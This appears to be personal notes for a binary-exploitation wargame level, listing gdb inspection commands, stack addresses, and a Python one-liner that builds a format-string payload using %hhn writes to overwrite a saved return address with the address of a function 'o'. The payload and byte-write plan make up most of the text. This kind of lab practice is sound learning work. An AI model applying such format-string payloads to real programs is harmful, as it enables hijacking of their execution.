Commands :

i r $eip $esp $ebp
x/32xw $esp
x/32xw 0xADDRESS
info frame
info proc mappings
info variables


Current level :

m address : 0xbffff71c
m address formatted : \x1c\xf7\xff\xbf

address of m 1st byte : 0xbffff71f
address of m 2nd byte : 0xbffff71e
address of m 3rd byte : 0xbffff71d
address of m 4th byte : 0xbffff71c

address of m 1st byte formatted : \x1f\xf7\xff\xbf
address of m 2nd byte formatted : \x1e\xf7\xff\xbf
address of m 3rd byte formatted : \x1d\xf7\xff\xbf
address of m 4th byte formatted : \x1c\xf7\xff\xbf


Wanted value :

Address of o => 0x080484a4

- `0x08` or `8`
- `0x04` or `4`
- `0x84` or `132`
- `0xa4` or `164`


- Write value `0x08` to address `0xbffff71f`
- Write value `0x04` to address `0xbffff71e`
- Write value `0x84` to address `0xbffff71d`
- Write value `0xa4` to address `0xbffff71c`



x/136xw $esp

esp : 0xbffff500
buffer start : 0xbffff510
ebp : 0xbffff718
eip : 0xbffff71c

x/28xw 0xbffff510


buffer start at $4


divide by 4, add 3, get index

python -c 'print("____%27$hhn____%28$hhn______________________________________________________________\x1c\xf7\xff\xbf\x1d\xf7\xff\xbf\x1e\xf7\xff\xbf\x1f\xf7\xff\xbf______________________________________________%26$hhn________________________________%25$hhn")'
python -c 'print("____%27$xxx____%28$xxx______________________________________________________________\x1c\xf7\xff\xbf\x1d\xf7\xff\xbf\x1e\xf7\xff\xbf\x1f\xf7\xff\xbf______________________________________________%26$xxx________________________________%25$xxx")'
